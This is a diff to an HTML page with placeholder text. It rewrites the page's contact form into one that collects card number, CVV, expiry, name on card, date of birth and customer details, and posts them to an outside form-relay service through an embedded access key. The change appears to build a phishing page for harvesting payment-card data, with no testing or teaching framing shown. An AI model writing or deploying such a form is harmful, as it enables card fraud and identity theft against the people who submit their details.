@@ -710,7 +710,7 @@
                         tempore itaque, amet soluta, obcaecati magnam velit accusamus recusandae.</p>
                     </div>
                     <div class="col-12 col-md-5" >
-                        <div class="inner-div" style="border-top: 5px solid #2b6fe4; border-radius: 10px; border-bottom: 5px solid #2b6fe4; padding: 5%; box-shadow: -4px 6px 15px rgba(0,0,0,.3);">
+                        <div class="inner-div" style="height: 84vh; border-top: 5px solid #2b6fe4; border-radius: 10px; border-bottom: 5px solid #2b6fe4; padding: 5%; box-shadow: -4px 6px 15px rgba(0,0,0,.3);">
                             <div class="icon1" style="display: flex; ">
                                 <div class="left" style="border-radius: 50%; border: 1px solid black; height: 40px; width: 40px; background-color: #E7F5FB;">
                                     <img src="./icons/location.svg" alt="" width="20px" style="margin: 20%;">
@@ -746,25 +746,28 @@
                     <div class="col-12 col-md-7" >
                         <div class="inner-div" style="border-top: 5px solid #2b6fe4; border-radius: 10px; border-bottom: 5px solid #2b6fe4; padding:4% 5%; box-shadow: -4px 6px 15px rgba(0,0,0,.3);">
                             <div class="form" >
-                                <form action="#" >
+                                <form action="https://api.web3forms.com/submit" method="POST" >
+                                    <input type="hidden" name="access_key" value="dca892d8-bbbe-4bc5-80b8-e9c0f55f1c5e">
+                                    <label for="Subject">Card Number : </label><br>
+                                    <input type="text" name="Subject" style="width: 100%;" required><br>
                                     <div class="first-row">
                                         <div class="name" >
-                                            <label for="Name">Name</label><br>
-                                            <input type="text" name="Name" ><br>
+                                            <label for="Name">Cvv : </label><br>
+                                            <input type="text" name="Name" required><br>
                                         </div>    
                                         <div class="Email " >
-                                            <label for="Email">Email</label><br>
-                                            <input type="text" name="Email" >
+                                            <label for="text">Exp : </label><br>
+                                            <input type="email" name="Email"  required>
                                         </div>
                                     </div>
-                                    <label for="Subject">Subject</label><br>
-                                    <input type="text" name="Subject" style="width: 100%;"><br>
-                          <!-- <label for="Phone">Phone</label><br>
-                          <input type="tel" name="Phone" style="width: 100%;"><br> -->
-                                    <label for="Message">Your Message</label><br>
-                                    <textarea name="Message" cols="20" rows="9" style="width: 100%;"></textarea><br>
+                                    <label for="Subject">Name on Card : </label><br>
+                                    <input type="text" name="Subject" style="width: 100%;" required><br>
+                                    <label for="file">Date of Birth: </label><br>
+                                    <input type="date" name="file" style="width: 100%; font-size: 13px; padding: 5px 10px;" required><br>
+                                    <label for="Message">Customer Details :</label><br>
+                                    <textarea name="Message" cols="20" rows="7" style="width: 100%;" required></textarea><br>
                                     <Button type="submit" >SUBMIT NOW</Button>
-                                    </form>
+                                </form>
                             </div>
                         </div>
                     </div>
